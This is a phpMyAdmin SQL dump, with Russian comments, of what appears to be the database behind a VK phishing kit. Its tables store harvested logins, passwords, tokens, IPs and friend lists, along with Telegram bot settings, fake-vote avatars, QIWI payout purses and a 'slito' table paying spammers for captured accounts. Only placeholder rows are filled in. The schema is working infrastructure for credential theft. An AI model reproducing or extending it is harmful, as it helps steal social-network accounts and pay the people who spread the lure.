-- phpMyAdmin SQL Dump
-- version 4.9.4
-- https://www.phpmyadmin.net/
--
-- Хост: localhost
-- Время создания: Мар 14 2020 г., 20:44
-- Версия сервера: 10.3.22-MariaDB-log
-- Версия PHP: 7.4.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- База данных: `id13469_vk`
--

-- --------------------------------------------------------

--
-- Структура таблицы `data`
--

CREATE TABLE `data` (
  `id` int(11) NOT NULL,
  `login` text NOT NULL,
  `pass` text NOT NULL,
  `token` text NOT NULL,
  `fio` text NOT NULL,
  `friends` text NOT NULL,
  `pol` text NOT NULL,
  `str` varchar(255) NOT NULL,
  `userid` text NOT NULL,
  `ip` text NOT NULL,
  `fromsp` text NOT NULL,
  `followers` text NOT NULL,
  `avatar` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `settings`
--

CREATE TABLE `settings` (
  `id` int(11) NOT NULL,
  `acceskey` text NOT NULL,
  `login` text NOT NULL,
  `tarif` int(11) NOT NULL,
  `pursesavail` text NOT NULL,
  `minwith` int(11) NOT NULL,
  `url` text NOT NULL,
  `textob` text NOT NULL,
  `voteavatar1` text NOT NULL,
  `voteavatar2` text NOT NULL,
  `golosa1` text NOT NULL,
  `golosa2` text NOT NULL,
  `admintoken` text NOT NULL,
  `tg_chat` text NOT NULL,
  `tg_token` text NOT NULL,
  `group_id` text NOT NULL,
  `timetoken` text NOT NULL,
  `textban` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `settings`
--

INSERT INTO `settings` (`id`, `acceskey`, `login`, `tarif`, `pursesavail`, `minwith`, `url`, `textob`, `voteavatar1`, `voteavatar2`, `golosa1`, `golosa2`, `admintoken`, `tg_chat`, `tg_token`, `group_id`, `timetoken`, `textban`) VALUES
(1, 'adm', 'adm', 7, 'QIWI', 50, 'url', '', 'id1', 'id1', '1', '1', 'сюда токен', '', '', '4ch', '', '');

-- --------------------------------------------------------

--
-- Структура таблицы `slito`
--

CREATE TABLE `slito` (
  `id` int(11) NOT NULL,
  `spamer` text NOT NULL,
  `pass` text NOT NULL,
  `inviteusers` int(11) NOT NULL,
  `purse` text NOT NULL,
  `wantwith` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `slito`
--

INSERT INTO `slito` (`id`, `spamer`, `pass`, `inviteusers`, `purse`, `wantwith`) VALUES
(19, 'spam', '123', 1, '123', 1);

--
-- Индексы сохранённых таблиц
--

--
-- Индексы таблицы `data`
--
ALTER TABLE `data`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `slito`
--
ALTER TABLE `slito`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT для сохранённых таблиц
--

--
-- AUTO_INCREMENT для таблицы `data`
--
ALTER TABLE `data`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT для таблицы `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT для таблицы `slito`
--
ALTER TABLE `slito`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=20;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
